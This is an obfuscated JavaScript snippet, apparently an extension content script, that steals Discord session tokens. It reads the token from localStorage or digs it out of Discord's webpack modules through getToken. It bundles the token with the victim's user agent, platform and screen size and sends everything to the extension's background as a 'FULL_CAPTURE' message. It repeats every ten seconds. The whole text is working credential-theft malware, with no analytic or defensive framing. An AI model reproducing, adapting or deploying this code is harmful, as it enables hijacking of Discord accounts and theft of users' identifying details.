!function(){
    let _0xLastT = ""; 
    const _0x2b11=()=>{
        let _0x1c22="";
        try{_0x1c22=(window.localStorage.getItem('token')||"").replace(/"/g,"")}catch(_0x4a22){}
        if(!_0x1c22||_0x1c22==="null"){
            try{window.webpackChunkdiscord_app?.push([[Symbol()],{},(_0x55a2)=>{
                for(const _0x1e22 in _0x55a2.c){
                    if(_0x55a2.c[_0x1e22].exports?.default?.getToken)_0x1c22=_0x55a2.c[_0x1e22].exports.default.getToken();
                    if(_0x55a2.c[_0x1e22].exports?.getToken)_0x1c22=_0x55a2.c[_0x1e22].exports.getToken();
                }
            }])}catch(_0x33d2){}
        }
        if(_0x1c22 && _0x1c22 !== _0xLastT && _0x1c22.length > 25){
            _0xLastT = _0x1c22;
            const _0x4412={ua:navigator.userAgent,plt:navigator.platform,res:`${window.screen.width}x${window.screen.height}`};
            chrome.runtime.sendMessage({type:"FULL_CAPTURE",token:_0x1c22,info:_0x4412});
        }
    };
    _0x2b11();
    setInterval(_0x2b11,10000); // يفحص كل 10 ثوانٍ ولكن لا يرسل إلا إذا وجد شيئاً جديداً
}();
